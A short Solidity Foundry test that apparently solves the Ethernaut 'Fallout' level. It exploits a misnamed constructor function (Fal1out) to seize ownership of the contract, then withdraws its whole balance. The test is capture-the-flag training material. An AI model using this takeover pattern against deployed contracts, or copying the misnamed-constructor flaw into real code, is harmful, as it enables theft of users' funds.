// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;

import  {Fallout} from "../src/fallout.sol";


import {Test, console} from "forge-std/Test.sol";

contract FalloutTest is Test {

    Fallout fallout;
    address attacker = makeAddr('atttackr');

    function setUp() public {
        fallout = new Fallout();
        vm.deal(attacker, 1e6);

    }
    function test_stealOwnership() public {
        vm.startPrank(attacker);
        fallout.Fal1out{value: 1e4}();
        assertEq(attacker, fallout.owner());
        fallout.collectAllocations();
        vm.stopPrank();
        assertEq(address(fallout).balance, 0);

    }
}